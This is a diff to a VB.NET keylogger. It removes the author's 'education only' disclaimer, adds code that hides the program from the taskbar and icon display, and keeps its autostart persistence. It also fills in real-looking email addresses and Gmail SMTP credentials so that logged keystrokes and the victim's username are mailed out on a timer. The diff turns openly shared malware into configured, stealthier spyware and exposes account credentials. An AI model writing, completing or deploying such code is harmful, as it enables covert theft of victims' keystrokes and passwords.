@@ -1,7 +1,4 @@
-﻿'Simple Keylogger Coded By PhilipMo@TeamH4C
-'DO NOT ABUSE
-'JUST USE FOR EDUCATION
-Imports System.Web
+﻿Imports System.Web
 Imports System.IO
 Imports System.Net.Mail
 Public Class Form1
@@ -23,6 +20,8 @@ Public Class Form1
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         Me.Hide()
+        Me.ShowInTaskbar = False
+        Me.ShowIcon = False
         Try ' Startup Stealth
             IO.File.Copy(AppPath, AutoStart)
             HideFile.IsReadOnly = True
@@ -304,13 +303,13 @@ Public Class Form1
 
     Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
         Dim MyMailMessage As New MailMessage()
-        MyMailMessage.From = New MailAddress("my@gmail.com")
-        MyMailMessage.To.Add("my@gmail.com")
+        MyMailMessage.From = New MailAddress("opera1337@protonmail.com")
+        MyMailMessage.To.Add("opera1337@protonmail.com")
         MyMailMessage.Subject = (Environment.UserName + " Data " + System.DateTime.Now())
         MyMailMessage.Body = RichTextBox1.Text
         Dim SMTPServer As New SmtpClient("smtp.gmail.com")
         SMTPServer.Port = 587
-        SMTPServer.Credentials = New System.Net.NetworkCredential("mail@mail.com", "Password")
+        SMTPServer.Credentials = New System.Net.NetworkCredential("crackable1321@gmail.com", "P@ssw0rd!!")
         SMTPServer.EnableSsl = True
         SMTPServer.Send(MyMailMessage)
         RichTextBox1.Text = ("")
